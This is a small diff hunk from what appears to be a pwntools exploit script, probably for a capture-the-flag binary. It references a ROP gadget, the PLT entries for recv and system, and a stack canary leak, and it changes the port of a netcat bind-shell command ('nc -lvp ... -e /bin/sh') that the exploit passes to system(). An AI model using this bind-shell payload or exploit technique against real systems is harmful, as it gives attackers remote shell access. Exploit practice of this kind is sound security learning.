@@ -148,7 +148,7 @@ ppppr = 0x08048eec
 recv_plt = e.plt['recv']
 system_plt = e.plt['system']
 
-cmd = 'nc -lvp 10101 -e /bin/sh'
+cmd = 'nc -lvp 1234 -e /bin/sh'
 
 #stack canary leak
 p.sendlineafter('> ','1')
